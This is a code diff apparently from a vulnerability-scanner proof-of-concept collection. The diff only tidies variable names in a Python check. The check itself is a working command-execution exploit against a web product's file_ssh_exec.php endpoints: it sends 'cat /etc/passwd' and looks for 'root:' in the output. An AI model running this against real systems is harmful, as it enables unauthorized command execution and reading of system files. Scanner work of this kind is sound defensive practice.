@@ -39,9 +39,9 @@ class Poc(ABPoc):
             arg = self.target
             url = arg + '/function/ssh/file_ssh.php'
             #不同网站id可能不同，默认id为1,若file_ssh.php无法访问，则尝试以默认id执行命令
-            exec_id = 10;
+            exec_id = str(10)
             #获取执行命令页面id
-            code, head, res, err, _ = hh.http(url)
+            code, _head, res, _err, _ = hh.http(url)
             if code == 200:
                 m = re.search(r'onclick="window\.open\(\'file_ssh_exec\.php\?action=user_query&id=([\d]*)\'\)" value="执行命令"', res)
                 if m:
@@ -49,15 +49,15 @@ class Poc(ABPoc):
             post = 'cmd=cat+%2Fetc%2Fpasswd&action=user_cmd_submit&id=' + exec_id
             #执行命令
             exec_url = arg + '/function/ssh/file_ssh_exec.php'
-            code, head, res, err, _ = hh.http(exec_url, post=post)
+            code, _head, res, _err, _ = hh.http(exec_url, post=post)
             if code != 200:
                 return False
             #等待执行结果，最多等待50s
             result_id = False
-            for i in range(5):
+            for _i in range(5):
                 #debug(str(i))
                 time.sleep(10)
-                code, head, res, err, _ = hh.http(arg + '/function/ssh/file_ssh_exec.php?action=get_real_content&lines=1&page_num=1&id=' + exec_id)
+                code, _head, res, _err, _ = hh.http(arg + '/function/ssh/file_ssh_exec.php?action=get_real_content&lines=1&page_num=1&id=' + exec_id)
                 if (code == 200) and ('查看' in res):
                     m = re.search(r'a href="file_ssh_result\.php\?cmd_id=([\d]*)"', res)
                     if m:
@@ -66,7 +66,7 @@ class Poc(ABPoc):
             if not result_id:
                 return False
             #获取执行结果
-            code, head, res, err, _ = hh.http(arg + '/function/ssh/file_ssh_result.php?cmd_id=' + result_id)
+            code, _head, res, _err, _ = hh.http(arg + '/function/ssh/file_ssh_result.php?cmd_id=' + result_id)
             #print code, head, res, err
             if (code == 200) and 'root:' in res:
                 #security_hole('command execution: ' + arg + '/function/ssh/file_ssh_exec.php?action=get_real_content&lines=1&page_num=1&id='+exec_id)
